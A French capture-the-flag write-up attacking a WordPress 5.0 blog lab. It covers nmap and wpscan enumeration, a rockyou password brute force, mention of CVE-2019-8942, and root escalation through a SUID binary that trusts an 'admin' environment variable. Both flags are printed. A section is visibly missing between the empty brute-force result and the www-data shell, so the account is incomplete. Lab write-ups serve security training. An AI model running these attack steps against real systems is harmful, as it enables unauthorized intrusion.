Objectif: Exploiter une vulnérabilité dans le blog wordpress de Billy Joel pour obtenir un shell sur la machine cible et faire une escalade de privilège en vue de récupérer les flag user et root

## Configuration

Nous allons associer l’ip cible qui nous a été donné au nom de domaine `blog.thm` en modifiant le fichier `/etc/hosts`

```bash
echo "IP_SERVEUR blog.thm" >> /etc/hosts
```

## Ennumération

Nous allons détecter les ports ouverts, les services tournant derrières eux et leurs versions à l’aide de l’outil `nmap`

```bash
nmap -sC -sV blog.thm
```

Le résultat est le suivant

```bash
PORT    STATE SERVICE     VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG
```

Les ports ouverts sont donc:

- Port 22: Port SSH
- Port 80: Port HTTP
- Ports 139 et 445 : netbios

## Reconnaissance

En se rendant à la page d’acceuil du site via [`http://blog.thm`](http://blog.thm), la dernière ligne nous indique Powered By Wordpress donc le CMS utilisé est donc `Wordpress`. Analysons alors le site avec `wpscan` pour détecter la version exacte de Wordpress utilisée

```bash
wpscan --url http://blog.thm
```

```bash
[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>
```

Ainsi le blog utilise la version 5.0 de wordpress. Cette version présente une énorme faille de sécurité  [**CVE-2019-8942](https://www.cvedetails.com/cve/CVE-2019-8942/) (RCE via métadonnées d'image) :** Un utilisateur disposant de privilèges d'auteur pouvait modifier l'entrée `_wp_attached_file` pour pointer vers un fichier arbitraire. En téléchargeant une image contenant du code PHP dans ses métadonnées Exif, il était possible d'exécuter ce code sur le serveur. Pour cela il faut donc avec des identifiants valides

Etape 1: Lister les utilisateurs du blog

```bash
wpscan --url http://blog.thm -e
```

On a les utilisateurs

```bash
kwheel
bjoel
Karen Wheeler
Billy Joel
```

On copie ensuite ces noms dans un fichier `users.txt`

Etape2: Brute force du mot de passe

```bash
wpscan --url http://blog.thm -U users.txt -P /usr/share/wordlists/rockyou.txt
```

Résultat :

```bash
Valid Combinations Found:

```

www-data@blog:/home/bjoel$ ^Z

Après analyse du fichier il y ressors la fonction C suivante

```c

undefined8 main(void)

{
  char *pcVar1;
  
  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}
```

Elle vérifie si `admin` existe comme variable d’environnement si c’est le cas lance un shell root sinon affiche `Not an Admin`

## Capture root flag

Pour obtenir un shell root on va donc déclarer une variable d’environnement admin puis lancer le script

```bash
www-data@blog:/var/www/wordpress$ export admin=1
export admin=1
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/var/www/wordpress# 
```

On a obtenu le shell root il est tant de récupérer le root flag

```bash
root@blog:/var/www/wordpress# ls /root
ls /root
root.txt
root@blog:/var/www/wordpress# cat /root/root.txt
cat /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
root@blog:/var/www/wordpress# 
```

⛳**Root Flag** : 9a0b2b618bef9bfa7ac28c1353d9f318

## Capture user flag

Après avoir récupérer le root flag il est tant de récupérer le user flag

```bash
find / -type f -name "user.txt" 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt

```

Le user flag qu’on doit récupérer se situe donc dans le dossier `/media/usb`.

```bash
root@blog:/var/www/wordpress# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
root@blog:/var/www/wordpress# 
```

⛳**User Flag**: c8421899aae571f7af486492b71a8ab7

## Recommendations

- N’utiliser que les versions à jour des CMS , désactiver les anciennes versions
- Limiter les permissions des utilisateurs standards
- Appliquer le principe du moindre privilège
- Ne jamais laisser les script root dans les dossiers des utilisateurs standards
